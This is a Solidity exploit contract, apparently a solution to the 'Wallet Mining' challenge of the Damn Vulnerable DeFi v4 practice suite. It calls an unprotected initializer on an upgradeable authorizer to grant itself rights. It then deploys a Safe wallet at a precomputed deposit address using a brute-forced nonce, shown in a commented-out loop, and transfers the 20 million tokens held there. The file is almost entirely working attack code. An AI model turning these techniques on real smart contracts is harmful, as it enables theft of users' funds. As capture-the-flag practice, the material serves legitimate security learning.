// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
contract Recover {
    address ward;
    address user; 
    uint256 userPrivateKey;
    AuthorizerUpgradeable authorizer;
    Safe singletonCopy; 
    SafeProxyFactory proxyFactory;
    WalletDeployer walletDeployer;
    DamnValuableToken token;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    //This was derived from the commented section in constructor
    //You can use your own methods to deduce this Nonce
    //Here, it is declared implicitly for simplicity
    uint256 targetNonce = 13;

    constructor(
        address _ward,
        address _user,
        uint256 _userPrivateKey,
        address _authorizer,
        address _singletonCopy,
        address _proxyFactory,
        address _walletDeployer,
        address _token,
        bytes memory _signatures
    ) {
        ward = _ward;
        user = _user;
        userPrivateKey = _userPrivateKey;
        authorizer = AuthorizerUpgradeable(_authorizer);
        singletonCopy = Safe(payable(_singletonCopy));
        proxyFactory = SafeProxyFactory(_proxyFactory);
        walletDeployer = WalletDeployer(_walletDeployer);  
        token = DamnValuableToken(_token);

        address[] memory owners = new address[](1);
        owners[0] = _user;
        bytes memory _initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            1,
            address(0),
            "",
            address(0),
            address(0),
            0,
            payable(address(0))
        );   
        // while (true) {
        //     bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), targetNonce));
        //     bytes memory initCode = abi.encodePacked(
        //         type(SafeProxy).creationCode,
        //         uint256(uint160(singletonCopy))
        //     );
        //     bytes32 hash = keccak256(
        //         abi.encodePacked(bytes1(0xff), proxyFactory, salt, keccak256(initCode))
        //     );
        //     address derivedAddress = address(uint160(uint256(hash)));
        //     if (derivedAddress == USER_DEPOSIT_ADDRESS) {
        //         break;
        //     }
        //     targetNonce++;
        // }
        recover(_signatures, _initializer);
        
    }
    function recover(bytes memory signatures, bytes memory initializer) public{
        address [] memory _wards = new address[](1);
        _wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(_wards, aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, targetNonce);
        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(address(token), 0, abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT)), 
                                    Enum.Operation.Call, 50000, 0, 0, address(0), payable(0), signatures);
        token.transfer(ward, 1 ether);
    }
}